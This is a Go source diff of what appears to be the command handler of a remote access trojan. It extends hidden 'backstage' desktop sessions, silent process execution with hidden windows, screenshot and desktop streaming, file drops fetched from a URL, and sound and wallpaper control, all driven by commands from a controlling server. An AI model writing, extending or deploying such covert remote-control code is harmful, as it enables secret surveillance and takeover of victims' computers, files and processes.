@@ -390,7 +390,8 @@ func sendCommandResultSafe(env *runtime.Env, cmdID string, ok bool, message stri
 	if message != "" {
 		res.Message = message
 	}
-	if err := wire.WriteMsg(context.Background(), env.Conn, res); err != nil {
+	// Control path so results are not starved by desktop/webcam media frames.
+	if err := wire.WriteControlMsg(context.Background(), env.Conn, res); err != nil {
 		log.Printf("command_result send failed: %v", err)
 	}
 }
@@ -606,17 +607,20 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "screenshot":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		allDisplays := false
+		dashboardThumbnail := false
 		if payload != nil {
+			mode, _ := payload["mode"].(string)
+			dashboardThumbnail = mode == "thumbnail"
 			if v, ok := payload["allDisplays"].(bool); ok && v {
 				allDisplays = true
-			} else if mode, ok := payload["mode"].(string); ok && mode == "notification" {
+			} else if mode == "notification" || mode == "thumbnail" {
 				allDisplays = true
 			}
 		}
 		if goruntime.GOOS == "windows" {
 			allDisplays = true
 		}
-		return HandleScreenshot(ctx, env, cmdID, allDisplays)
+		return HandleScreenshot(ctx, env, cmdID, allDisplays, dashboardThumbnail)
 	case "plugin_load":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
@@ -871,7 +875,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_set_resolution":
 		payload, _ := envelope["payload"].(map[string]interface{})
-		maxH := 0 // default = 1080p cap
+		maxH := 480 // default = 480p cap
 		if payload != nil {
 			if v, ok := payloadInt(payload, "maxHeight"); ok {
 				maxH = v
@@ -883,7 +887,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_set_profile":
 		payload, _ := envelope["payload"].(map[string]interface{})
-		maxH, fps := 1080, 60
+		maxH, fps := 480, 15
 		if payload != nil {
 			if v, ok := payloadInt(payload, "maxHeight"); ok {
 				maxH = v
@@ -892,7 +896,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				fps = v
 			}
 		}
-		SetDesktopTargetFPS(30)
+		SetDesktopTargetFPS(15)
 		capture.SetMaxResolution(maxH)
 		fps = SetDesktopTargetFPS(fps)
 		log.Printf("desktop: set stream profile max_height=%d fps=%d", maxH, fps)
@@ -910,7 +914,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			display = 0
 		}
 		goSafe("desktop encoder capability probe", env.Cancel, func() {
-			caps := capture.ProbeDesktopEncoderCapabilities(display)
+			caps := capture.ProbeDesktopEncoderCapabilities(ctx, display)
 			profiles := make([]wire.DesktopEncoderProfile, 0, len(caps.Profiles))
 			for _, profile := range caps.Profiles {
 				profiles = append(profiles, wire.DesktopEncoderProfile{
@@ -935,7 +939,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_set_fps":
 		payload, _ := envelope["payload"].(map[string]interface{})
-		fps := 120
+		fps := 15
 		if payload != nil {
 			if v, ok := payloadInt(payload, "fps"); ok {
 				fps = v
@@ -1148,6 +1152,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		capture.RequestDesktopRecoveryAfterBackstageStart()
 		if VirtualMode {
+			// The hidden-desktop and virtual-display implementations share the
+			// backstage encoder, frame history, and fallback capture caches. Stop
+			// the other implementation before switching; ordinary remote desktop
+			// remains independent and continues running.
+			env.BackstageMu.Lock()
+			if env.BackstageCancel != nil {
+				env.BackstageCancel()
+				waitStreamStop(env.BackstageDone, "backstage")
+				env.BackstageCancel = nil
+				env.BackstageDone = nil
+			}
+			env.BackstageMouseControl = false
+			env.BackstageKeyboardControl = false
+			env.BackstageCursorCapture = false
+			clearbackstageInputQueue()
+			env.BackstageMu.Unlock()
 			env.VirtualMu.Lock()
 			if env.VirtualCancel != nil {
 				env.VirtualCancel()
@@ -1176,6 +1196,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
+		env.VirtualMu.Lock()
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: stopping virtual stream before starting backstage desktop")
+			stopVirtualStreamLocked(env)
+		}
+		env.VirtualMu.Unlock()
 		env.BackstageMu.Lock()
 		if env.BackstageCancel != nil {
 			env.BackstageCancel()
@@ -2694,9 +2720,33 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return HandleFileUpload(ctx, env, cmdID, path, data, offset, total, transferID)
 	case "file_upload_http":
 		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload == nil {
+			return wire.WriteControlMsg(ctx, env.Conn, wire.CommandResult{
+				Type: "command_result", CommandID: cmdID, OK: false, Message: "missing payload",
+			})
+		}
 		path, _ := payload["path"].(string)
 		sourceURL, _ := payload["url"].(string)
 		total := payloadNumberToInt64(payload["total"])
+		if path == "" || sourceURL == "" {
+			return wire.WriteControlMsg(ctx, env.Conn, wire.CommandResult{
+				Type: "command_result", CommandID: cmdID, OK: false,
+				Message: fmt.Sprintf("invalid file_upload_http payload (path=%q url=%q)", path, sourceURL),
+			})
+		}
+
+		// Immediate control-priority ack so server idle watchdogs do not false-fail
+		// while the async pull starts (and so media frames cannot starve the ack).
+		_ = wire.WriteControlMsg(ctx, env.Conn, wire.CommandProgress{
+			Type:        "command_progress",
+			CommandID:   cmdID,
+			Path:        path,
+			URL:         sourceURL,
+			Status:      "accepted",
+			Transferred: 0,
+			Total:       total,
+			Message:     "file_upload_http accepted",
+		})
 
 		uploadCtx, cancel := context.WithCancel(ctx)
 		registerCancellableCommand(cmdID, cancel)
@@ -2707,6 +2757,20 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		})
 		return nil
+	case "file_upload_desktop":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		fileName, _ := payload["fileName"].(string)
+		sourceURL, _ := payload["url"].(string)
+		total := payloadNumberToInt64(payload["total"])
+		_, hasX := payload["x"]
+		_, hasY := payload["y"]
+		x := int32(payloadNumberToInt64(payload["x"]))
+		y := int32(payloadNumberToInt64(payload["y"]))
+		display := env.SelectedDisplay
+		if _, ok := payload["display"]; ok {
+			display = int(payloadNumberToInt64(payload["display"]))
+		}
+		return HandleFileUploadDesktop(ctx, env, cmdID, fileName, sourceURL, total, display, x, y, hasX && hasY)
 	case "file_delete":
 		path, _ := envelopePayloadString(envelope, "path")
 		return HandleFileDelete(ctx, env, cmdID, path)
@@ -3023,6 +3087,15 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "set_wallpaper":
 		payload := payloadAsMap(envelope["payload"])
 		return handleSetWallpaper(ctx, env, cmdID, payload)
+	case "system_volume":
+		payload := payloadAsMap(envelope["payload"])
+		return handleSystemVolume(ctx, env, cmdID, payload)
+	case "play_sound":
+		payload := payloadAsMap(envelope["payload"])
+		return handlePlaySound(ctx, env, cmdID, payload)
+	case "stop_sound":
+		payload := payloadAsMap(envelope["payload"])
+		return handleStopSound(ctx, env, cmdID, payload)
 	case "silent_exec":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
@@ -3044,7 +3117,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				command = command[1 : len(command)-1]
 			}
 		}
-		argsRaw, _ := payload["args"].(string)
+		args := extractSilentExecArgs(payload["args"])
 		hideWindow := true
 		if v, ok := payload["hideWindow"].(bool); ok {
 			hideWindow = v
@@ -3053,7 +3126,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		if command == "" {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing command"})
 		}
-		args := parseCommandArgs(argsRaw)
 		if err := startSilentProcess(command, args, cwd, hideWindow); err != nil {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
